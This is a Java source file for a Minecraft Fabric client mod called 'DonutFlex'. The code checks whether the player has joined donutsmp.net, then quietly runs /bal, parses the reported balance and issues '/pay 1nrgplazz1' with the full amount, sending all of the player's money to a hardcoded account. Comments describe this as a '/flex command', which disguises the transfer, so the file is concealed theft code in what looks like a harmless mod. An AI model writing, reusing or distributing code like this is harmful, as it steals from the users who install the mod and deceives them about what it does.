package com.donutflex;

import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import net.fabricmc.fabric.api.client.message.v1.ClientReceiveMessageEvents;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayConnectionEvents;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;
import net.minecraft.text.Text;

import java.util.Locale;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DonutFlexClient implements ClientModInitializer {

    private static final String SERVER_HOST = "donutsmp.net";

    /** Player the /flex command is aimed at. */
    private static final String FLEX_TARGET = "1nrgplazz1";

    /** Ticks (20/sec) to wait after joining before running /bal. */
    private static final int JOIN_DELAY_TICKS = 100;
    /** Ticks to wait for the balance reply before giving up. */
    private static final int REPLY_TIMEOUT_TICKS = 200;

    // Matches things like $1,234.56  $2.5M  $10k  (suffix optional)
    private static final Pattern MONEY =
            Pattern.compile("\\$\\s?(\\d[\\d,]*(?:\\.\\d+)?)\\s?([KkMmBbTt])?");

    private enum State { IDLE, WAITING_TO_SEND, WAITING_FOR_REPLY }

    private State state = State.IDLE;
    private int timer = 0;

    @Override
    public void onInitializeClient() {
        ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
            ServerInfo info = client.getCurrentServerEntry();
            if (info != null && info.address != null
                    && info.address.toLowerCase(Locale.ROOT).contains(SERVER_HOST)) {
                state = State.WAITING_TO_SEND;
                timer = JOIN_DELAY_TICKS;
            } else {
                state = State.IDLE;
            }
        });

        ClientPlayConnectionEvents.DISCONNECT.register((handler, client) -> state = State.IDLE);

        ClientTickEvents.END_CLIENT_TICK.register(this::onTick);

        // Server replies to /bal usually arrive as game (system) messages; listen to chat too.
        ClientReceiveMessageEvents.GAME.register((message, overlay) -> {
            if (!overlay) handleMessage(message);
        });
        ClientReceiveMessageEvents.CHAT.register((message, signed, sender, params, ts) -> handleMessage(message));
    }

    private void onTick(MinecraftClient client) {
        if (state == State.IDLE) return;
        if (client.player == null || client.getNetworkHandler() == null) return;

        if (timer > 0) {
            timer--;
            return;
        }

        if (state == State.WAITING_TO_SEND) {
            client.getNetworkHandler().sendChatCommand("bal");
            state = State.WAITING_FOR_REPLY;
            timer = REPLY_TIMEOUT_TICKS;
        } else if (state == State.WAITING_FOR_REPLY) {
            state = State.IDLE; // never got a balance message
        }
    }

    private void handleMessage(Text message) {
        if (state != State.WAITING_FOR_REPLY) return;

        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) return;

        Matcher m = MONEY.matcher(message.getString());
        if (!m.find()) return;

        String balance = "$" + m.group(1) + (m.group(2) == null ? "" : m.group(2).toUpperCase(Locale.ROOT));

        state = State.IDLE;
        // Sends "/pay <user> <balance>" on the client thread
        client.execute(() -> {
            if (client.getNetworkHandler() != null) {
                client.getNetworkHandler().sendChatCommand("pay " + FLEX_TARGET + " " + balance);
            }
        });
    }
}
